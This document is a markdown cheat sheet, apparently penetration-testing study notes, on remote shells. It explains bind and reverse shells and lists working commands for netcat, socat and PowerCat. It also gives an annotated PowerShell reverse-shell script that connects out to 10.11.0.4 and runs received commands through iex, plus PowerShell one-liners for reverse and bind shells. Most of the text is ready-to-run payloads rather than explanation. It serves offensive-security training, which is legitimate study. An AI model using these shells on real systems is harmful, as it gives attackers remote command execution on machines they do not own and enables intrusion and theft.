# Remote Shells

## Background

Imagine a program running on the commandline. It prints output to _STDOUT_, errors to _STDERR_, and receives input from _STDIN_ (generally speaking). Instead of having I/O being sent and receives on the commandline, we could instead hook them up (_bind them_) to a network socket. Thus a remote peer can send input to the program's input, and the program sends its output and errors to the remote peer. This is the concept of a **remote shell**.

Remember the difference between a **bind shell** and a **reverse (bind) shell**:

**Bind Shell**:

- Q: "Who is presenting the shell?"

  - A: The one binding the socket

- Q: "Who is accessing the shell?"

  - A: The remote peer connecting

**Reverse Bind Shell**:

- Q: "Who is presenting the shell?"

  - A: The remote peer connecting

- Q: "Who is accessing the shell?"

  - A: The one binding the socket

## netcat

- Bind shell with `netcat`

On the system who intends to bind the program and listen:

```bash
$ netcat -lvnp PORT -e PROGRAM
```

On the system who intends to connect:

```bash
$ netcat -nv ADDRESS PORT
```

- Reverse-bind shell with `netcat`

On the system who intends to listen:

```bash
$ netcat -lvnp PORT
```

On the system who intends to expose the program and connect:

```bash
$ netcat -nv ADDRESS PORT -e PROGRAM
```

## socat

- Reverse shell with `socat`:

On the system who intends to listen:

```bash
$ socat -d -d TCP4-LISTEN:PORT STDOUT
```

On the system who intends to expose the program and connect:

```bash
$ socat TCP4:ADDR:PORT exec:PROGRAM
```

- Encrypted bind shell with `socat`:

On the system who intends to expose the program and listen:

```bash
$ socat OPENSSL-LISTEN:PORT,cert=pem_file,verify=0,fork exec:PROGRAM
```

On the system who intends to connect:

```bash
$ socat - OPENSSL:ADDR:PORT,verify=0
```

## PowerShell

- Reverse shell with PowerShell (expanded form):

```powershell
# Initialise the TCP socket connection stream, and create a buffer
$client = New-Object System.Net.Sockets.TCPClient('10.11.0.4',443);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};

while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
{
  # Retrieve the $data (i.e. remote command) from the stream buffer
  $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
  # IEX means Invoke-Expression. It will run the command in $data, redirect stderr, and retrieve the output
  $sendback = (iex $data 2>&1 | Out-String );
  # Return the output of the command, and append a little prompt
  $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
  # Encode to ASCII
  $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
  # Write the command output + prompt back
  $stream.Write($sendbyte,0,$sendbyte.Length);
  $stream.Flush();
}

$client.Close();
```

- Reverse shell with PowerShell (one-liner):

```powershell
powershell -c '$client = New-Object System.Net.Sockets.TCPClient(''X.X.X.X'',9999);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i =$stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + ''PS '' + (pwd).Path + ''> '';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
```

- Bind shell with PowerShell (one-liner):

```powershell
powershell -c '$listener = New-Object System.Net.Sockets.TcpListener(''X.X.X.X'',9999);$listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + ''PS '' + (pwd).Path + ''> '';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();$listener.Stop()'
```

## PowerCat

- Reverse shell with `powercat`:

```powershell
powercat -c ADDR -p PORT -e program
```

- Bind shell with `powercat`:

```powershell
powercat -l -p PORT -e program
```
